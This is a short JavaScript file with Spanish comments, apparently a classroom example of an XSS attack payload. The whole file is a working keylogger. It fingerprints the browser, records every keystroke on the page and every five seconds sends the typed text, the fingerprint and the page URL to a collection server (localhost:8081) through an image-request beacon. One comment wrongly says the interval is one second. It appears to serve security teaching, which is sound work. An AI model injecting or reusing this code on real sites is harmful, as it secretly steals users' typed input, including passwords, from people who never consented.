
//Este ejemplo sería para mandar todo lo que escriban nuestros usuarios
//de la otra aplicación a este servidor
var keys = '';
var hash = hashNavegador()
 
function hashNavegador() {
    const str = 
		navigator.userAgent + 
		navigator.language + 
		screen.width + 
		screen.height + 
		Intl.DateTimeFormat().resolvedOptions().timeZone
		
	let hash = 0;
	for (let i = 0, len = str.length; i < len; i++) {
	    let chr = str.charCodeAt(i)
	    hash = (hash << 5) - hash + chr
	    hash |= 0; // Convert to 32bit integer
	}
	return hash; 
}


//vamos guardando lo que escriba
document.onkeypress = function(e) {
	//Esto para que funcione en navegadores antiguos de IE
	//ya que en esos navegadores no nos pasaban el evento por parametro
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    //Key tiene el ascii
    key = String.fromCharCode(key);
    keys += key;
}

//cada 1 segundo mandamos lo que haya escrito el usuario al SVTeclas
window.setInterval(function(){
    new Image().src = 'http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/SVTeclas?t='+keys+'&hash='+hash+'&pagina='+document.location;
    keys = '';
}, 5000);




